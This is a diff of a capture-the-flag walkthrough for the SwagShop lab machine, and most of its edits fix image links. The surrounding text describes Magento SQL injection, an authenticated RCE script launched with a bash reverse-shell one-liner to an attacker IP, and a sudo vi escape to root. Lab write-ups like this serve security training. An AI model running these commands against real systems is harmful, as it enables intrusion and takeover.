@@ -36,6 +36,8 @@ Lets add swagshop.htb to `/etc/hosts`.
 
 We can see that the site on port 80 is running Magento.
 
+![swagshop_site.png](../assets/swagshop_assets/swagshop_site.png)
+
 Running magescan against the target we see it is running version 1.9.0.0:
 
 ```
@@ -63,11 +65,11 @@ Kicking off some directory fuzzing with:
 
 We find some DB credentials in http://swagshop.htb/app/etc/local.xml
 
-swagshop_xml.png
+![swagshop_xml.png](../assets/swagshop_assets/swagshop_xml.png)
 
 Continuing through the directory scanning results we find the admin login page at: http://swagshop.htb/index.php/admin
 
-swagshop_admin.png
+![swagshop_admin.png](../assets/swagshop_assets/swagshop_admin.png)
 
 Looking for Magento exploits I find that Magento Shoplift is vulnerable to SQL injection. We can use the PoC at https://github.com/joren485/Magento-Shoplift-SQLI to create a new user:
 
@@ -80,7 +82,7 @@ Check http://swagshop.htb/admin with creds ypwq:123
 
 We can now login at http://swagshop.htb/index.php/admin
 
-swagshop_in.png
+![swagshop_in.png](../assets/swagshop_assets/swagshop_in.png)
 
 Thinking back to the exploits I found for Magento, I recall having seen an authenticated RCE exploit. Now that I have valid credentials, this may work.
 
@@ -90,7 +92,7 @@ But this exploit will need a bit of tweaking for our purposes.
 
 First lets add our created username and password, as well as update the install date variable found at http://swagshop.htb/app/etc/local.xml
 
-swagshop_config.png
+![swagshop_config.png](../assets/swagshop_assets/swagshop_config.png)
 
 Trying to run the script with the updates we've made, we get an error with mechanize:
 
@@ -117,7 +119,7 @@ mechanize._form_controls.AmbiguityError: more than one control matching name 'lo
 
 Lets comment out line 53:
 
-swagshop_comment.png
+#[swagshop_comment.png](../assets/swagshop_assets/swagshop_comment.png)
 
 ### Exploitation
 
@@ -136,11 +138,11 @@ Lets use this to get a reverse shell:
 └─$ python2 magento_rce.py http://swagshop.htb/index.php/admin/ "bash -c 'bash -i >& /dev/tcp/10.10.14.108/443 0>&1'" 
 ```
 
-swagshop_shell.png
+![swagshop_shell.png](../assets/swagshop_assets/swagshop_shell.png)
 
 We can then grab the user.txt flag:
 
-swagshop_user_flag.png
+![swagshop_user_flag.png](../assets/swagshop_assets/swagshop_user_flag.png)
 
 ### Privilege Escalation
 
@@ -156,7 +158,7 @@ User www-data may run the following commands on swagshop:
     (root) NOPASSWD: /usr/bin/vi /var/www/html/*
 ```
 
-This is a super dangerous setting because we can use vi to execute system commands, and if we can execute those commands with sudo, we effectively have a root shell. 
+This is a super dangerous configuration because we can use vi to execute system commands, and if we can execute those commands with sudo, we effectively have a root shell. 
 
 Lets try it by entering `:sh` in our vi session:
 
@@ -171,7 +173,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 We can now grab the root.txt flag:
 
-swagshop_root_flag.png
+![swagshop_root_flag.png](../assets/swagshop_assets/swagshop_root_flag.png)
 
 Thanks for following along!
 
